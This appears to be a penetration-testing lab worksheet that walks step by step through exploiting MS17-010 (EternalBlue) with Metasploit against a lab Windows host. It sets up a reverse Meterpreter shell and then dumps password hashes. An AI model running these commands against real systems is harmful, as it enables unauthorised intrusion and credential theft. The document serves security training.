# Metasploit Practical Lab

## Scenario: Exploiting a Vulnerable Service
You have identified a Windows machine on your network (192.168.1.50) that is missing critical security patches and has SMB exposed. Your objective is to gain a Meterpreter shell on the system using the MS17-010 (EternalBlue) vulnerability.

## Objective
Successfully configure and launch an exploit via Metasploit to achieve remote code execution and establish a reverse connection.

## Tasks
1. **Preparation:**
   - Launch `msfconsole`.
   - Verify database connectivity using `db_status`.

2. **Search and Module Selection:**
   - Search for the EternalBlue exploit.
   - *Command:* `search ms17_010`
   - Select the exploit module.
   - *Command:* `use exploit/windows/smb/ms17_010_eternalblue`

3. **Configuration:**
   - View the required options.
   - *Command:* `show options`
   - Set the target IP address.
   - *Command:* `set RHOSTS 192.168.1.50`

4. **Payload Selection:**
   - Choose a reverse Meterpreter payload for a 64-bit architecture.
   - *Command:* `set payload windows/x64/meterpreter/reverse_tcp`
   - Set your local IP (LHOST) for the reverse connection.
   - *Command:* `set LHOST <your_ip>`

5. **Exploitation:**
   - Run the exploit.
   - *Command:* `exploit`

6. **Post-Exploitation (Meterpreter):**
   - Once the session opens, gather system information.
   - *Command:* `sysinfo`
   - Verify your current privilege level.
   - *Command:* `getuid`
   - Attempt to dump password hashes.
   - *Command:* `hashdump`

## Review
Ensure you document the steps taken and the level of access achieved. Remember to cleanly exit the session using the `exit` command when testing is complete.
